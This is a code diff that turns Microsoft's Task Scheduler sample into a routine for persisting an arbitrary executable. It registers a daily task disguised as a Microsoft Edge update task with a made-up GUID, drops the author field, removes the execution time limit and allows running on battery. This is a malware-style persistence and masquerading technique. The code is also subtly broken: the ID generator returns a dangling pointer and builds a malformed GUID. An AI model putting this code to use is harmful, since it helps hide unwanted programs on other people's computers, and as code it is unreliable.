@@ -3,24 +3,52 @@
  time the task is registered. 
 ********************************************************************/
 
-#define _WIN32_DCOM
-
-#include <windows.h>
-#include <iostream>
-#include <stdio.h>
-#include <comdef.h>
-#include <wincred.h>
-//  Include the task header file.
-#include <taskschd.h>
-#include <string>
-#pragma comment(lib, "taskschd.lib")
-#pragma comment(lib, "comsupp.lib")
-#pragma comment(lib, "credui.lib")
+#include <schtask.h>
 
 using namespace std;
 
+// Random ID, in the format below:
+// {8F76EDCD-8202-4830-BAC5-5128155FAB4E}
+LPCWSTR gen_random() {
+    srand(time(NULL));
+    static const char alphanum[] =
+        "0123456789"
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    std::string tmp_s;
+    tmp_s.reserve(36);
 
-int __cdecl wmain(int argc, wchar_t *argv[]) {
+    tmp_s += "{";
+    // First 7-char chunk
+    for (int i = 0; i < 7; i++) {
+        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
+    }
+    tmp_s += "-";
+
+    // 3 middle 4-char chunks
+    for (int i = 0; i < 3; i++) {
+        for (int i = 0; i < 4; i++) {
+            tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
+        }
+        tmp_s += "-";
+    }
+
+    // Last 12-char chunk
+    for (int i = 0; i < 12; i++) {
+        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
+    }
+
+    tmp_s += "}";
+
+    std::wstring stemp = std::wstring(tmp_s.begin(), tmp_s.end());
+    LPCWSTR sw = stemp.c_str();
+    
+    return sw;
+}
+
+// Creates a daily scheduled task that executes the executable at exePath.
+// Exe path should be absolute filepath.
+// timeToRunDaily runs it everyday at this time; it should be in the format: "HH:MM:SS"
+int createScheduledTask(wchar_t *exePath, wchar_t *timeToRunDaily) {
     //  ------------------------------------------------------
     //  Initialize COM.
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
@@ -51,18 +79,13 @@ int __cdecl wmain(int argc, wchar_t *argv[]) {
 
     //  ------------------------------------------------------
     //  Create a name for the task.
-    LPCWSTR wszTaskName = L"Time Trigger Test Task";
+    // MicrosoftEdgeUpdateTaskMachineUA{8F76EDCD-8202-4830-BAC5-5128155FAB4E}
+    LPCWSTR wszTaskName = L"MicrosoftEdgeUpdateTaskMachineUA";
+    LPCWSTR randomID = gen_random();
+    std::wstring df_concat = std::wstring(wszTaskName) + randomID;
+    wszTaskName = df_concat.c_str();
 
-    //  Get the windows directory and set the path to executable.
-    // wstring wstrExecutablePath = _wgetenv( L"WINDIR");
-    // wstrExecutablePath += L"\\SYSTEM32\\" + argv[1];
-
-    if (!(argc > 1)) {
-        printf("\nError: Missing full path of program that is to be persisted.");
-        return 1;
-    }
-    wstring wstrExecutablePath = argv[1];
-
+    wstring wstrExecutablePath = exePath;
 
     //  ------------------------------------------------------
     //  Create an instance of the Task Service. 
@@ -132,7 +155,8 @@ int __cdecl wmain(int argc, wchar_t *argv[]) {
         return 1;
     }
     
-    hr = pRegInfo->put_Author( L"Author Name" );    
+    // Uncomment for ability to add author name if needed
+    // hr = pRegInfo->put_Author( L"Author Name" );    
     pRegInfo->Release();  
     if( FAILED(hr) )
     {
@@ -184,10 +208,31 @@ int __cdecl wmain(int argc, wchar_t *argv[]) {
     
     //  Set setting values for the task.  
     hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
-    pSettings->Release();
     if( FAILED(hr) )
     {
-        printf("\nCannot put setting information: %x", hr );
+        printf("\nCannot put start setting information: %x", hr );
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    // Set the power settings for the task.
+    hr = pSettings->put_DisallowStartIfOnBatteries( VARIANT_FALSE );
+    if( FAILED(hr) )
+    {
+        printf("\nCannot put power setting information: %x", hr );
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+     // Set the execution time limit settings for the task.
+    hr = pSettings->put_ExecutionTimeLimit( SysAllocString(L"PT0S") );
+    if( FAILED(hr) )
+    {
+        printf("\nCannot put execution time limit setting information: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
@@ -197,6 +242,7 @@ int __cdecl wmain(int argc, wchar_t *argv[]) {
     // Set the idle settings for the task.
     IIdleSettings *pIdleSettings = NULL;
     hr = pSettings->get_IdleSettings( &pIdleSettings );
+    pSettings->Release();
     if( FAILED(hr) )
     {
         printf("\nCannot get idle setting information: %x", hr );
@@ -206,7 +252,7 @@ int __cdecl wmain(int argc, wchar_t *argv[]) {
         return 1;
     }
 
-    hr = pIdleSettings->put_WaitTimeout(L"PT5M");
+    hr = pIdleSettings->put_WaitTimeout(SysAllocString(L"PT5M"));
     pIdleSettings->Release();
     if( FAILED(hr) )
     {
@@ -219,7 +265,7 @@ int __cdecl wmain(int argc, wchar_t *argv[]) {
     
 
     //  ------------------------------------------------------
-    //  Get the trigger collection to insert the time trigger.
+    //  Get the trigger collection to insert the logon trigger.
     ITriggerCollection *pTriggerCollection = NULL;
     hr = pTask->get_Triggers( &pTriggerCollection );
     if( FAILED(hr) )
@@ -231,9 +277,9 @@ int __cdecl wmain(int argc, wchar_t *argv[]) {
         return 1;
     }
 
-    //  Add the time trigger to the task.
+    //  Add the logon trigger to the task.
     ITrigger *pTrigger = NULL;    
-    hr = pTriggerCollection->Create( TASK_TRIGGER_TIME, &pTrigger );     
+    hr = pTriggerCollection->Create( TASK_TRIGGER_DAILY, &pTrigger );     
     pTriggerCollection->Release();
     if( FAILED(hr) )
     {
@@ -244,33 +290,24 @@ int __cdecl wmain(int argc, wchar_t *argv[]) {
         return 1;
     }
 
-    ITimeTrigger *pTimeTrigger = NULL;
-    hr = pTrigger->QueryInterface( 
-        IID_ITimeTrigger, (void**) &pTimeTrigger );
+    IDailyTrigger *pDailyTrigger = NULL;
+    hr = pTrigger->QueryInterface(IID_IDailyTrigger, (void**) &pDailyTrigger);
     pTrigger->Release();
     if( FAILED(hr) )
     {
-        printf("\nQueryInterface call failed for ITimeTrigger: %x", hr );
+        printf("\nQueryInterface call failed for IDailyTrigger: %x", hr );
         pRootFolder->Release();
         pTask->Release();
         CoUninitialize();
         return 1;
     }
 
-    hr = pTimeTrigger->put_Id( _bstr_t( L"Trigger1" ) );
+    hr = pDailyTrigger->put_Id( _bstr_t( L"Trigger1" ) );
     if( FAILED(hr) )
         printf("\nCannot put trigger ID: %x", hr);
 
-    hr = pTimeTrigger->put_EndBoundary( _bstr_t(L"2015-05-02T08:00:00") );
-    if( FAILED(hr) )
-        printf("\nCannot put end boundary on trigger: %x", hr);
-
-    //  Set the task to start at a certain time. The time 
-    //  format should be YYYY-MM-DDTHH:MM:SS(+-)(timezone).
-    //  For example, the start boundary below
-    //  is January 1st 2005 at 12:05
-    hr = pTimeTrigger->put_StartBoundary( _bstr_t(L"2005-01-01T12:05:00") );
-    pTimeTrigger->Release();    
+    hr = pDailyTrigger->put_StartBoundary( _bstr_t(L"2000-01-01T") + _bstr_t(timeToRunDaily) );
+    pDailyTrigger->Release();
     if( FAILED(hr) )
     {
         printf("\nCannot add start boundary to trigger: %x", hr );
